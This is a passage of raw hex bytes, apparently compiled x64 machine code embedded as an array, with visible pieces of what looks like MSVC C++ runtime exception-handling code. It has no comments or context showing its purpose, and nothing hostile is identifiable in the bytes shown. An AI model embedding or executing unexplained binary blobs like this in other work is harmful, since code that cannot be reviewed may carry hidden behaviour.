0x48, 0x63, 0x4f, 0x20, 0x48, 0x3, 0xc1, 0x75, 0x21, 0x8b, 0x47, 0x24, 0xc1, 0xe8, 0x2, 0xa8, 0x1, 0xf, 0x84, 0xd8, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd7, 0x48, 0x8b, 0xce, 0xe8, 0xf1, 0xef, 0xff, 0xff, 0x84, 0xc0, 0xf, 0x85, 0xc5, 0x0, 0x0, 0x0, 0x8b, 0x47, 0x24, 0xc1, 0xe8, 0x2, 0xa8, 0x1, 0xf, 0x85, 0xd, 0x1, 0x0, 0x0, 0x44, 0x39, 0x6f, 0x20, 0x74, 0x11, 0xe8, 0x0, 0xf4, 0xff, 0xff, 0x48, 0x8b, 0xd0, 0x48, 0x63, 0x47, 0x20, 0x48, 0x3, 0xd0, 0xeb, 0x3, 0x49, 0x8b, 0xd5, 0x48, 0x8b, 0xcb, 0xe8, 0x21, 0xc, 0x0, 0x0, 0x84, 0xc0, 0xf, 0x85, 0x8d, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x4d, 0x88, 0x4c, 0x8b, 0xc7, 0x48, 0x8b, 0xd6, 0x49, 0x8b, 0xcc, 0xe8, 0x2f, 0xf0, 0xff, 0xff, 0x8a, 0x8d, 0x98, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xc8, 0x4c, 0x8b, 0x44, 0x24, 0x68, 0x48, 0x8b, 0xd3, 0x88, 0x4c, 0x24, 0x50, 0x83, 0xc9, 0xff, 0x48, 0x89, 0x74, 0x24, 0x48, 0x4c, 0x89, 0x6c, 0x24, 0x40, 0x89, 0x4c, 0x24, 0x38, 0x89, 0x4c, 0x24, 0x30, 0x49, 0x8b, 0xcc, 0x48, 0x89, 0x7c, 0x24, 0x28, 0x4c, 0x89, 0x6c, 0x24, 0x20, 0xe8, 0xff, 0xf1, 0xff, 0xff, 0xeb, 0x3d, 0x83, 0x7f, 0xc, 0x0, 0x76, 0x37, 0x80, 0xbd, 0x98, 0x0, 0x0, 0x0, 0x0, 0xf, 0x85, 0x9d, 0x0, 0x0, 0x0, 0x8b, 0x85, 0xa0, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xce, 0x4c, 0x89, 0x6c, 0x24, 0x38, 0x4d, 0x8b, 0xc7, 0x89, 0x44, 0x24, 0x30, 0x49, 0x8b, 0xd4, 0x44, 0x89, 0x74, 0x24, 0x28, 0x48, 0x8b, 0xcb, 0x48, 0x89, 0x7c, 0x24, 0x20, 0xe8, 0x7c, 0x0, 0x0, 0x0, 0xe8, 0xc3, 0xec, 0xff, 0xff, 0x48, 0x83, 0x78, 0x38, 0x0, 0x75, 0x67, 0x48, 0x8b, 0x4d, 0x10, 0x48, 0x33, 0xcc, 0xe8, 0x94, 0xa1, 0x0, 0x0, 0x48, 0x81, 0xc4, 0x28, 0x1, 0x0, 0x0, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0x5d, 0xc3, 0xb2, 0x1, 0x48, 0x8b, 0xcb, 0xe8, 0xaa, 0xe8, 0xff, 0xff, 0x48, 0x8d, 0x4d, 0xf8, 0xe8, 0x9, 0x6, 0x0, 0x0, 0x48, 0x8d, 0x15, 0x66, 0x3d, 0x1, 0x0, 0x48, 0x8d, 0x4d, 0xf8, 0xe8, 0xad, 0xe, 0x0, 0x0, 0xcc, 0xe8, 0xa3, 0x1d, 0x0, 0x0, 0xcc, 0xe8, 0x6d, 0xec, 0xff, 0xff, 0x48, 0x89, 0x58, 0x20, 0xe8, 0x64, 0xec, 0xff, 0xff, 0x48, 0x8b, 0x4c, 0x24, 0x68, 0x48, 0x89, 0x48, 0x28, 0xe8, 0x86, 0x1d, 0x0, 0x0, 0xcc, 0xe8, 0x28, 0x1e, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x20, 0x4c, 0x89, 0x40, 0x18, 0x48, 0x89, 0x50, 0x10, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0x68, 0xc1, 0x48, 0x81, 0xec, 0xc0, 0x0, 0x0, 0x0, 0x81, 0x39, 0x3, 0x0, 0x0, 0x80, 0x49, 0x8b, 0xf1, 0x4d, 0x8b, 0xf8, 0x4c, 0x8b, 0xf1, 0x74, 0x6e, 0xe8, 0x11, 0xec, 0xff, 0xff, 0x44, 0x8b, 0x65, 0x6f, 0x48, 0x8b, 0x7d, 0x67, 0x48, 0x83, 0x78, 0x10, 0x0, 0x74, 0x75, 0x33, 0xc9, 0xff, 0x15, 0x86, 0xb2, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0xe8, 0xf2, 0xeb, 0xff, 0xff, 0x48, 0x39, 0x58, 0x10, 0x74, 0x5f, 0x41, 0x81, 0x3e, 0x4d, 0x4f, 0x43, 0xe0, 0x74, 0x56, 0x41, 0x81, 0x3e, 0x52, 0x43, 0x43, 0xe0, 0x44, 0x8b, 0x6d, 0x77, 0x74, 0x4d, 0x48, 0x8b, 0x45, 0x7f, 0x4c, 0x8b, 0xce, 0x48, 0x8b, 0x55, 0x4f, 0x4d, 0x8b, 0xc7, 0x44, 0x89, 0x64, 0x24, 0x38, 0x49, 0x8b, 0xce, 0x48, 0x89, 0x44, 0x24, 0x30, 0x44, 0x89, 0x6c, 0x24, 0x28, 0x48, 0x89, 0x7c, 0x24, 0x20, 0xe8, 0x60, 0xed, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x1f, 0x48, 0x8b, 0x9c, 0x24, 0x18, 0x1, 0x0, 0x0, 0x48, 0x81, 0xc4, 0xc0, 0x0, 0x0, 0x0, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5d, 0xc3, 0x44, 0x8b, 0x6d, 0x77, 0x48, 0x8b, 0x46, 0x8, 0x48, 0x89, 0x45, 0xaf, 0x48, 0x89, 0x7d, 0xa7, 0x83, 0x7f, 0xc, 0x0, 0xf, 0x86, 0x36, 0x1, 0x0, 0x0, 0x44, 0x89, 0x6c, 0x24, 0x28, 0x48, 0x8d, 0x55, 0xa7, 0x4c, 0x8b, 0xce, 0x48, 0x89, 0x7c, 0x24, 0x20, 0x45, 0x8b, 0xc4, 0x48, 0x8d, 0x4d, 0xdf, 0xe8, 0xe, 0xef, 0xff, 0xff, 0xf, 0x10, 0x45, 0xdf, 0xf3, 0xf, 0x7f, 0x45, 0xb7, 0x66, 0xf, 0x73, 0xd8, 0x8, 0x66, 0xf, 0x7e, 0xc0, 0x3b, 0x45, 0xf7, 0x73, 0x97, 0x4c, 0x8b, 0x4d, 0xdf, 0x44, 0x8b, 0x7d, 0xbf, 0x4c, 0x89, 0x4d, 0x47, 0x48, 0x8b, 0x45, 0xb7, 0x48, 0x8b, 0x0, 0x48, 0x63, 0x50, 0x10, 0x41, 0x8b, 0xc7, 0x48, 0x8d, 0xc, 0x80, 0x49, 0x8b, 0x41, 0x8, 0x4c, 0x8d, 0x4, 0x8a, 0x41, 0xf, 0x10, 0x4, 0x0, 0x49, 0x63, 0x4c, 0x0, 0x10, 0x89, 0x4d, 0xd7, 0x66, 0xf, 0x7e, 0xc0, 0xf, 0x11, 0x45, 0xc7, 0x41, 0x3b, 0xc4, 0xf, 0x8f, 0xa4, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x45, 0xc7, 0x48, 0xc1, 0xe8, 0x20, 0x44, 0x3b, 0xe0, 0xf, 0x8f, 0x93, 0x0, 0x0, 0x0, 0x48, 0x3, 0x4e, 0x8, 0x48, 0x8b, 0x5d, 0xcf, 0x48, 0xc1, 0xeb, 0x20, 0x48, 0xff, 0xcb, 0x48, 0x8d, 0x1c, 0x9b, 0x48, 0x8d, 0x1c, 0x99, 0x83, 0x7b, 0x4, 0x0, 0x74, 0x2d, 0x4c, 0x63, 0x6b, 0x4, 0xe8, 0x50, 0xf1, 0xff, 0xff, 0x49, 0x3, 0xc5, 0x74, 0x1b, 0x45, 0x85, 0xed, 0x74, 0xe, 0xe8, 0x41, 0xf1, 0xff, 0xff, 0x48, 0x63, 0x4b, 0x4, 0x48, 0x3, 0xc1, 0xeb, 0x2, 0x33, 0xc0, 0x80, 0x78, 0x10, 0x0, 0x75, 0x4d, 0x44, 0x8b, 0x6d, 0x77, 0xf6, 0x3, 0x40, 0x75, 0x44, 0x48, 0x8b, 0x45, 0x7f, 0x4c, 0x8b, 0xce, 0x4c, 0x8b, 0x45, 0x57, 0x49, 0x8b, 0xce, 0x48, 0x8b, 0x55, 0x4f, 0xc6, 0x44, 0x24, 0x58, 0x0, 0xc6, 0x44, 0x24, 0x50, 0x1, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8d, 0x45, 0xc7, 0x44, 0x89, 0x6c, 0x24, 0x40, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x83, 0x64, 0x24, 0x30, 0x0, 0x48, 0x89, 0x5c, 0x24, 0x28, 0x48, 0x89, 0x7c, 0x24, 0x20, 0xe8, 0x6f, 0xf8, 0xff, 0xff, 0x44, 0x8b, 0x6d, 0x77, 0x41, 0xff, 0xc7, 0x4c, 0x8b, 0x4d, 0x47, 0x44, 0x3b, 0x7d, 0xf7, 0xf, 0x82, 0xf, 0xff, 0xff, 0xff, 0xe9, 0x95, 0xfe, 0xff, 0xff, 0xe8, 0x10, 0x1c, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x20, 0x33, 0xdb, 0x4d, 0x8b, 0xf0, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0xf9, 0x39, 0x59, 0x4, 0xf, 0x84, 0xf0, 0x0, 0x0, 0x0, 0x48, 0x63, 0x71, 0x4, 0xe8, 0x8a, 0xf0, 0xff, 0xff, 0x4c, 0x8b, 0xc8, 0x4c, 0x3, 0xce, 0xf, 0x84, 0xdb, 0x0, 0x0, 0x0, 0x85, 0xf6, 0x74, 0xf, 0x48, 0x63, 0x77, 0x4, 0xe8, 0x71, 0xf0, 0xff, 0xff, 0x48, 0x8d, 0xc, 0x6, 0xeb, 0x5, 0x48, 0x8b, 0xcb, 0x8b, 0xf3, 0x38, 0x59, 0x10, 0xf, 0x84, 0xba, 0x0, 0x0, 0x0, 0xf6, 0x7, 0x80, 0x74, 0xa, 0xf6, 0x45, 0x0, 0x10, 0xf, 0x85, 0xab, 0x0, 0x0, 0x0, 0x85, 0xf6, 0x74, 0x11, 0xe8, 0x45, 0xf0, 0xff, 0xff, 0x48, 0x8b, 0xf0, 0x48, 0x63, 0x47, 0x4, 0x48, 0x3, 0xf0, 0xeb, 0x3, 0x48, 0x8b, 0xf3, 0xe8, 0x45, 0xf0, 0xff, 0xff, 0x48, 0x8b, 0xc8, 0x48, 0x63, 0x45, 0x4, 0x48, 0x3, 0xc8, 0x48, 0x3b, 0xf1, 0x74, 0x4b, 0x39, 0x5f, 0x4, 0x74, 0x11, 0xe8, 0x18, 0xf0, 0xff, 0xff, 0x48, 0x8b, 0xf0, 0x48, 0x63, 0x47, 0x4, 0x48, 0x3, 0xf0, 0xeb, 0x3, 0x48, 0x8b, 0xf3, 0xe8, 0x18, 0xf0, 0xff, 0xff, 0x4c, 0x63, 0x45, 0x4, 0x49, 0x83, 0xc0, 0x10, 0x4c, 0x3, 0xc0, 0x48, 0x8d, 0x46, 0x10, 0x4c, 0x2b, 0xc0, 0xf, 0xb6, 0x8, 0x42, 0xf, 0xb6, 0x14, 0x0, 0x2b, 0xca, 0x75, 0x7, 0x48, 0xff, 0xc0, 0x85, 0xd2, 0x75, 0xed, 0x85, 0xc9, 0x74, 0x4, 0x33, 0xc0, 0xeb, 0x39, 0xb0, 0x2, 0x84, 0x45, 0x0, 0x74, 0x5, 0xf6, 0x7, 0x8, 0x74, 0x24, 0x41, 0xf6, 0x6, 0x1, 0x74, 0x5, 0xf6, 0x7, 0x1, 0x74, 0x19, 0x41, 0xf6, 0x6, 0x4, 0x74, 0x5, 0xf6, 0x7, 0x4, 0x74, 0xe, 0x41, 0x84, 0x6, 0x74, 0x4, 0x84, 0x7, 0x74, 0x5, 0xbb, 0x1, 0x0, 0x0, 0x0, 0x8b, 0xc3, 0xeb, 0x5, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x8b, 0x7c, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x50, 0x48, 0x8b, 0xf9, 0x49, 0x8b, 0xf1, 0x49, 0x8b, 0xc8, 0x4d, 0x8b, 0xf0, 0x48, 0x8b, 0xea, 0xe8, 0x1f, 0xe8, 0xff, 0xff, 0xe8, 0xc2, 0xe8, 0xff, 0xff, 0x48, 0x8b, 0x9c, 0x24, 0x80, 0x0, 0x0, 0x0, 0xb9, 0x29, 0x0, 0x0, 0x80, 0xba, 0x26, 0x0, 0x0, 0x80, 0x83, 0x78, 0x40, 0x0, 0x75, 0x38, 0x81, 0x3f, 0x63, 0x73, 0x6d, 0xe0, 0x74, 0x30, 0x39, 0xf, 0x75, 0x10, 0x83, 0x7f, 0x18, 0xf, 0x75, 0xe, 0x48, 0x81, 0x7f, 0x60, 0x20, 0x5, 0x93, 0x19, 0xeb, 0x2, 0x39, 0x17, 0x74, 0x18, 0x8b, 0x3, 0x25, 0xff, 0xff, 0xff, 0x1f, 0x3d, 0x22, 0x5, 0x93, 0x19, 0x72, 0xa, 0xf6, 0x43, 0x24, 0x1, 0xf, 0x85, 0x8f, 0x1, 0x0, 0x0, 0xf6, 0x47, 0x4, 0x66, 0xf, 0x84, 0x8e, 0x0, 0x0, 0x0, 0x83, 0x7b, 0x4, 0x0, 0xf, 0x84, 0x7b, 0x1, 0x0, 0x0, 0x83, 0xbc, 0x24, 0x88, 0x0, 0x0, 0x0, 0x0, 0xf, 0x85, 0x6d, 0x1, 0x0, 0x0, 0xf6, 0x47, 0x4, 0x20, 0x74, 0x5d, 0x39, 0x17, 0x75, 0x37, 0x4c, 0x8b, 0x46, 0x20, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcb, 0xe8, 0x27, 0xf3, 0xff, 0xff, 0x83, 0xf8, 0xff, 0xf, 0x8c, 0x6b, 0x1, 0x0, 0x0, 0x3b, 0x43, 0x4, 0xf, 0x8d, 0x62, 0x1, 0x0, 0x0, 0x44, 0x8b, 0xc8, 0x48, 0x8b, 0xcd, 0x48, 0x8b, 0xd6, 0x4c, 0x8b, 0xc3, 0xe8, 0xb4, 0x4, 0x0, 0x0, 0xe9, 0x2c, 0x1, 0x0, 0x0, 0x39, 0xf, 0x75, 0x1e, 0x44, 0x8b, 0x4f, 0x38, 0x41, 0x83, 0xf9, 0xff, 0xf, 0x8c, 0x3a, 0x1, 0x0, 0x0, 0x44, 0x3b, 0x4b, 0x4, 0xf, 0x8d, 0x30, 0x1, 0x0, 0x0, 0x48, 0x8b, 0x4f, 0x28, 0xeb, 0xce, 0x4c, 0x8b, 0xc3, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcd, 0xe8, 0x67, 0xea, 0xff, 0xff, 0xe9, 0xf7, 0x0, 0x0, 0x0, 0x83, 0x7b, 0xc, 0x0, 0x75, 0x42, 0x8b, 0x3, 0x25, 0xff, 0xff, 0xff, 0x1f, 0x3d, 0x21, 0x5, 0x93, 0x19, 0x72, 0x14, 0x83, 0x7b, 0x20, 0x0, 0x74, 0xe, 0xe8, 0x47, 0xee, 0xff, 0xff, 0x48, 0x63, 0x4b, 0x20, 0x48, 0x3, 0xc1, 0x75, 0x20, 0x8b, 0x3, 0x25, 0xff, 0xff, 0xff, 0x1f, 0x3d, 0x22, 0x5, 0x93, 0x19, 0xf, 0x82, 0xbd, 0x0, 0x0, 0x0, 0x8b, 0x43, 0x24, 0xc1, 0xe8, 0x2, 0xa8, 0x1, 0xf, 0x84, 0xaf, 0x0, 0x0, 0x0, 0x81, 0x3f, 0x63, 0x73, 0x6d, 0xe0, 0x75, 0x6e, 0x83, 0x7f, 0x18, 0x3, 0x72, 0x68, 0x81, 0x7f, 0x20, 0x22, 0x5, 0x93, 0x19, 0x76, 0x5f, 0x48, 0x8b, 0x47, 0x30, 0x83, 0x78, 0x8, 0x0, 0x74, 0x55, 0xe8, 0xc, 0xee, 0xff, 0xff, 0x4c, 0x8b, 0xd0, 0x48, 0x8b, 0x47, 0x30, 0x48, 0x63, 0x48, 0x8, 0x4c, 0x3, 0xd1, 0x74, 0x40, 0xf, 0xb6, 0x8c, 0x24, 0x98, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xce, 0x89, 0x4c, 0x24, 0x38, 0x4d, 0x8b, 0xc6, 0x48, 0x8b, 0x8c, 0x24, 0x90, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd5, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x49, 0x8b, 0xc2, 0x8b, 0x8c, 0x24, 0x88, 0x0, 0x0, 0x0, 0x89, 0x4c, 0x24, 0x28, 0x48, 0x8b, 0xcf, 0x48, 0x89, 0x5c, 0x24, 0x20, 0xff, 0x15, 0x12, 0xaf, 0x0, 0x0, 0xeb, 0x3e, 0x48, 0x8b, 0x84, 0x24, 0x90, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xce, 0x48, 0x89, 0x44, 0x24, 0x38, 0x4d, 0x8b, 0xc6, 0x8b, 0x84, 0x24, 0x88, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd5, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8b, 0xcf, 0x8a, 0x84, 0x24, 0x98, 0x0, 0x0, 0x0, 0x88, 0x44, 0x24, 0x28, 0x48, 0x89, 0x5c, 0x24, 0x20, 0xe8, 0xcf, 0xf5, 0xff, 0xff, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x8b, 0x6c, 0x24, 0x68, 0x48, 0x8b, 0x74, 0x24, 0x70, 0x48, 0x8b, 0x7c, 0x24, 0x78, 0x48, 0x83, 0xc4, 0x50, 0x41, 0x5e, 0xc3, 0xe8, 0x96, 0x18, 0x0, 0x0, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0xc2, 0x48, 0x8d, 0xd, 0xfd, 0xbe, 0x0, 0x0, 0xf, 0x57, 0xc0, 0x48, 0x89, 0xb, 0x48, 0x8d, 0x53, 0x8, 0x48, 0x8d, 0x48, 0x8, 0xf, 0x11, 0x2, 0xe8, 0xf, 0x8, 0x0, 0x0, 0x48, 0x8d, 0x5, 0x10, 0xbf, 0x0, 0x0, 0x48, 0x89, 0x3, 0x48, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x48, 0x83, 0x61, 0x10, 0x0, 0x48, 0x8d, 0x5, 0x8, 0xbf, 0x0, 0x0, 0x48, 0x89, 0x41, 0x8, 0x48, 0x8d, 0x5, 0xed, 0xbe, 0x0, 0x0, 0x48, 0x89, 0x1, 0x48, 0x8b, 0xc1, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0xc2, 0x48, 0x8d, 0xd, 0xa1, 0xbe, 0x0, 0x0, 0xf, 0x57, 0xc0, 0x48, 0x89, 0xb, 0x48, 0x8d, 0x53, 0x8, 0x48, 0x8d, 0x48, 0x8, 0xf, 0x11, 0x2, 0xe8, 0xb3, 0x7, 0x0, 0x0, 0x48, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0x48, 0x8d, 0x5, 0x79, 0xbe, 0x0, 0x0, 0x48, 0x89, 0x1, 0x48, 0x83, 0xc1, 0x8, 0xe9, 0x25, 0x8, 0x0, 0x0, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x5, 0x5b, 0xbe, 0x0, 0x0, 0x48, 0x8b, 0xf9, 0x48, 0x89, 0x1, 0x8b, 0xda, 0x48, 0x83, 0xc1, 0x8, 0xe8, 0x2, 0x8, 0x0, 0x0, 0xf6, 0xc3, 0x1, 0x74, 0xd, 0xba, 0x18, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xcf, 0xe8, 0xe8, 0x9a, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0xc7, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x70, 0x48, 0x8b, 0xf9, 0x45, 0x33, 0xff, 0x44, 0x89, 0x7c, 0x24, 0x20, 0x44, 0x21, 0xbc, 0x24, 0xb0, 0x0, 0x0, 0x0, 0x4c, 0x21, 0x7c, 0x24, 0x28, 0x4c, 0x21, 0xbc, 0x24, 0xc8, 0x0, 0x0, 0x0, 0xe8, 0x9f, 0xe5, 0xff, 0xff, 0x4c, 0x8b, 0x68, 0x28, 0x4c, 0x89, 0x6c, 0x24, 0x40, 0xe8, 0x91, 0xe5, 0xff, 0xff, 0x48, 0x8b, 0x40, 0x20, 0x48, 0x89, 0x84, 0x24, 0xc0, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x77, 0x50, 0x48, 0x89, 0xb4, 0x24, 0xb8, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x47, 0x48, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8b, 0x5f, 0x40, 0x48, 0x8b, 0x47, 0x30, 0x48, 0x89, 0x44, 0x24, 0x48, 0x4c, 0x8b, 0x77, 0x28, 0x4c, 0x89, 0x74, 0x24, 0x50, 0x48, 0x8b, 0xcb, 0xe8, 0xaa, 0xe4, 0xff, 0xff, 0xe8, 0x4d, 0xe5, 0xff, 0xff, 0x48, 0x89, 0x70, 0x20, 0xe8, 0x44, 0xe5, 0xff, 0xff, 0x48, 0x89, 0x58, 0x28, 0xe8, 0x3b, 0xe5, 0xff, 0xff, 0x48, 0x8b, 0x50, 0x20, 0x48, 0x8b, 0x52, 0x28, 0x48, 0x8d, 0x4c, 0x24, 0x60, 0xe8, 0x25, 0xeb, 0xff, 0xff, 0x4c, 0x8b, 0xe0, 0x48, 0x89, 0x44, 0x24, 0x38, 0x4c, 0x39, 0x7f, 0x58, 0x74, 0x1c, 0xc7, 0x84, 0x24, 0xb0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xe8, 0xb, 0xe5, 0xff, 0xff, 0x48, 0x8b, 0x48, 0x70, 0x48, 0x89, 0x8c, 0x24, 0xc8, 0x0, 0x0, 0x0, 0x41, 0xb8, 0x0, 0x1, 0x0, 0x0, 0x49, 0x8b, 0xd6, 0x48, 0x8b, 0x4c, 0x24, 0x48, 0xe8, 0x70, 0x5, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8b, 0xbc, 0x24, 0xc0, 0x0, 0x0, 0x0, 0xeb, 0x78, 0xc7, 0x44, 0x24, 0x20, 0x1, 0x0, 0x0, 0x0, 0xe8, 0xcd, 0xe4, 0xff, 0xff, 0x83, 0x60, 0x40, 0x0, 0x48, 0x8b, 0xb4, 0x24, 0xb8, 0x0, 0x0, 0x0, 0x83, 0xbc, 0x24, 0xb0, 0x0, 0x0, 0x0, 0x0, 0x74, 0x21, 0xb2, 0x1, 0x48, 0x8b, 0xce, 0xe8, 0xc5, 0xe0, 0xff, 0xff, 0x48, 0x8b, 0x84, 0x24, 0xc8, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x48, 0x20, 0x44, 0x8b, 0x40, 0x18, 0x8b, 0x50, 0x4, 0x8b, 0x8, 0xeb, 0xd, 0x4c, 0x8d, 0x4e, 0x20, 0x44, 0x8b, 0x46, 0x18, 0x8b, 0x56, 0x4, 0x8b, 0xe, 0xff, 0x15, 0x17, 0xab, 0x0, 0x0, 0x44, 0x8b, 0x7c, 0x24, 0x20, 0x48, 0x8b, 0x5c, 0x24, 0x28, 0x4c, 0x8b, 0x6c, 0x24, 0x40, 0x48, 0x8b, 0xbc, 0x24, 0xc0, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0x74, 0x24, 0x50, 0x4c, 0x8b, 0x64, 0x24, 0x38, 0x49, 0x8b, 0xcc, 0xe8, 0x92, 0xea, 0xff, 0xff, 0x45, 0x85, 0xff, 0x75, 0x32, 0x81, 0x3e, 0x63, 0x73, 0x6d, 0xe0, 0x75, 0x2a, 0x83, 0x7e, 0x18, 0x4, 0x75, 0x24, 0x8b, 0x46, 0x20, 0x2d, 0x20, 0x5, 0x93, 0x19, 0x83, 0xf8, 0x2, 0x77, 0x17, 0x48, 0x8b, 0x4e, 0x28, 0xe8, 0xbd, 0xe0, 0xff, 0xff, 0x85, 0xc0, 0x74, 0xa, 0xb2, 0x1, 0x48, 0x8b, 0xce, 0xe8, 0x3b, 0xe0, 0xff, 0xff, 0xe8, 0x1e, 0xe4, 0xff, 0xff, 0x48, 0x89, 0x78, 0x20, 0xe8, 0x15, 0xe4, 0xff, 0xff, 0x4c, 0x89, 0x68, 0x28, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x48, 0x63, 0x48, 0x1c, 0x49, 0x8b, 0x6, 0x48, 0xc7, 0x4, 0x1, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x70, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x4c, 0x8b, 0x9, 0x49, 0x8b, 0xd8, 0x41, 0x83, 0x20, 0x0, 0xb9, 0x63, 0x73, 0x6d, 0xe0, 0x41, 0xb8, 0x20, 0x5, 0x93, 0x19, 0x41, 0x8b, 0x1, 0x3b, 0xc1, 0x75, 0x5d, 0x41, 0x83, 0x79, 0x18, 0x4, 0x75, 0x56, 0x41, 0x8b, 0x41, 0x20, 0x41, 0x2b, 0xc0, 0x83, 0xf8, 0x2, 0x77, 0x17, 0x48, 0x8b, 0x42, 0x28, 0x49, 0x39, 0x41, 0x28, 0x75, 0xd, 0xc7, 0x3, 0x1, 0x0, 0x0, 0x0, 0x41, 0x8b, 0x1, 0x3b, 0xc1, 0x75, 0x33, 0x41, 0x83, 0x79, 0x18, 0x4, 0x75, 0x2c, 0x41, 0x8b, 0x49, 0x20, 0x41, 0x2b, 0xc8, 0x83, 0xf9, 0x2, 0x77, 0x20, 0x49, 0x83, 0x79, 0x30, 0x0, 0x75, 0x19, 0xe8, 0x7d, 0xe3, 0xff, 0xff, 0xc7, 0x40, 0x40, 0x1, 0x0, 0x0, 0x0, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xc7, 0x3, 0x1, 0x0, 0x0, 0x0, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0x44, 0x89, 0x4c, 0x24, 0x20, 0x4c, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89, 0x4c, 0x24, 0x8, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x30, 0x45, 0x8b, 0xe1, 0x49, 0x8b, 0xf0, 0x48, 0x8b, 0xda, 0x4c, 0x8b, 0xf9, 0xe8, 0xbd, 0xe9, 0xff, 0xff, 0x4c, 0x8b, 0xe8, 0x48, 0x89, 0x44, 0x24, 0x28, 0x4c, 0x8b, 0xc6, 0x48, 0x8b, 0xd3, 0x49, 0x8b, 0xcf, 0xe8, 0x67, 0xed, 0xff, 0xff, 0x8b, 0xf8, 0xe8, 0x14, 0xe3, 0xff, 0xff, 0xff, 0x40, 0x30, 0x83, 0xff, 0xff, 0xf, 0x84, 0xeb, 0x0, 0x0, 0x0, 0x41, 0x3b, 0xfc, 0xf, 0x8e, 0xe2, 0x0, 0x0, 0x0, 0x83, 0xff, 0xff, 0xf, 0x8e, 0x14, 0x1, 0x0, 0x0, 0x3b, 0x7e, 0x4, 0xf, 0x8d, 0xb, 0x1, 0x0, 0x0, 0x4c, 0x63, 0xf7, 0xe8, 0x71, 0xe9, 0xff, 0xff, 0x48, 0x63, 0x4e, 0x8, 0x4a, 0x8d, 0x4, 0xf0, 0x8b, 0x3c, 0x1, 0x89, 0x7c, 0x24, 0x20, 0xe8, 0x5d, 0xe9, 0xff, 0xff, 0x48, 0x63, 0x4e, 0x8, 0x4a, 0x8d, 0x4, 0xf0, 0x83, 0x7c, 0x1, 0x4, 0x0, 0x74, 0x1c, 0xe8, 0x49, 0xe9, 0xff, 0xff, 0x48, 